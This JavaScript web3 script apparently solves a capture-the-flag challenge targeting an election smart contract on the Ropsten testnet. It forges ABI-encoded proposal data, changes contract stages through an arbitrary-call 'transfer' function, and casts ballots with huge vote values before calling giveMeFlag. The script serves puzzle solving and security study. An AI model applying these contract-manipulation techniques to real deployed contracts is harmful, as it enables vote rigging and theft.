fs = require('fs');
const Web3 = require('web3')

const web3 = new Web3(new Web3.providers.HttpProvider('https://ropsten.infura.io/v3/REDACTED'))
const eth = web3.eth;

let propsal_abi = ['address',
        {"Proposal":
            {
                "name":"string",
                "policies":"string",
                "valid":"bool",
            }
        }
    ];

function toArrayBuffer(buf) {
    var ab = new ArrayBuffer(buf.length);
    var view = new Uint8Array(ab);
    for (var i = 0; i < buf.length; ++i) {
        view[i] = buf[i];
    }
    return view;
}


async function load_accounts(file){
    account_list = JSON.parse(fs.readFileSync(file));
    let loaded_accounts = []
    for(var i = 0; i < account_list.length; ++i){
        let account = account_list[i];
        let cur_acct = web3.eth.accounts.privateKeyToAccount(account.privateKey);
        //cur_acct.balance = await web3.eth.getBalance(cur_acct.address);
        loaded_accounts.push(cur_acct);
    };
    return loaded_accounts;
}

function load_abi(file){
    return new eth.Contract(JSON.parse(fs.readFileSync(file)));
}

async function get_signed(account, _to, _value, _data)
{
    return account.signTransaction({
        to: _to,
        value: _value,
        data:_data,
        gasLimit: 8000000,
        gasPrice:12000000000,
    })
}

async function change_status(election, num)
{
    let stage_accounts = await load_accounts('stage_accounts.json')
    //t1_data = await election.methods.giveMeMoney().encodeABI(); 
    //tx1 = await get_signed(stage_accounts[num], election.options.address, 0, t1_data);
    //s1 = await eth.sendSignedTransaction(tx1.rawTransaction);

    t1_data = await election.methods.transfer(election.options.address, 0, '0x41', "_setStage(uint256)").encodeABI(); 
    tx1 = await get_signed(stage_accounts[num], election.options.address, 0, t1_data);
    s1 = await eth.sendSignedTransaction(tx1.rawTransaction);
    console.log("Done");
}

async function add_proposal(election, account){
    var addr = election.options.address
    
    let valid_encoded = election.methods.properEncode(addr, {name:"JizMan", policies:"Give me the flag, please", valid:true}, addr, addr).encodeABI() 
    let sice = valid_encoded.slice(10+0x80*2)

    fake_parameters = Buffer.from(sice, 'hex');
    fake_parameters = "0x"+fake_parameters.toString('hex')

    console.log("Fake data -> "+fake_parameters);

    // for abi hack
    election.options.address = "0x348b15fDC7AD4a63ec308887C9EadBeB4055Cc39"
    let fake_encoded = await election.methods.testdeet(addr, 0x80, fake_parameters, "propose(address,(string,string,bool))").call()
    election.options.address = addr


    //console.log(valid_encoded)
    //console.log(eth.abi.decodeParameters(propsal_abi,valid_encoded.slice(10)));
    //console.log(fake_encoded);
    let t1_data = election.methods.transfer(election.options.address, 0x80, fake_parameters, "propose(address,(string,string,bool))").encodeABI()
    tx1 = await get_signed(account, election.options.address, 0, t1_data);
    s1 = await eth.sendSignedTransaction(tx1.rawTransaction);
    console.log("done");

}

async function stage2(election, account)
{
    addr = election.options.address;
    election.options.address = "0x23ba49C21A7CeA3aDFDE92B2F61a25f62EE4810F";
    let my_votes = ["0x3a56Dea9417D1417cA9AB3CE37d6E804300f3171", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]
    let competitor_votes = ["0x0000000000000000000000000000000000009453", "0x1"]
    let encoded_ballot = await election.methods.ballotEncode([my_votes, competitor_votes]).call();
    console.log(encoded_ballot);

    election.options.address = addr;

    t1_data = election.methods.vote(encoded_ballot).encodeABI();
    t1 = await get_signed(account,election.options.address, 0, t1_data);
    await eth.sendSignedTransaction(t1.rawTransaction);

    console.log("done")
}

async function stage3(election, account)
{
    addr = election.options.address;
    election.options.address = "0x23ba49C21A7CeA3aDFDE92B2F61a25f62EE4810F";
    let my_votes = ["0x3a56Dea9417D1417cA9AB3CE37d6E804300f3171", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]
    let competitor_votes = ["0x0000000000000000000000000000000000009453", "0x1"]
    let encoded_ballot = await election.methods.ballotEncode([my_votes, competitor_votes]).call();
    console.log(encoded_ballot);

    election.options.address = addr;

    t1_data = election.methods.reveal(1, [my_votes, competitor_votes]).encodeABI();
    t1 = await get_signed(account, election.options.address, 0, t1_data);
    await eth.sendSignedTransaction(t1.rawTransaction);
    
    console.log("done")
}

async function stage4(election, account)
{
    t1_data = election.methods.giveMeFlag().encodeABI();
    t1 = await get_signed(account, election.options.address, 0, t1_data);
    await eth.sendSignedTransaction(t1.rawTransaction);
    console.log("done");
}

async function main(){
    let accounts = await load_accounts('accounts.json');
    let stage_accounts = await load_accounts('stage_accounts.json')
    let election = load_abi('election.abi')
    election.options.address = "0xf8d083836bce629221e8148bd326ed4b15e94a48";

    //await change_status(election, 0);
    //await add_proposal(election, accounts[4])

    //await change_status(election, 1);
    //await stage2(election, accounts[1])

    //await change_status(election, 2);
    //await stage3(election, accounts[1])
    
    //await change_status(election, 3);
    await stage4(election, accounts[4]);
}

main();

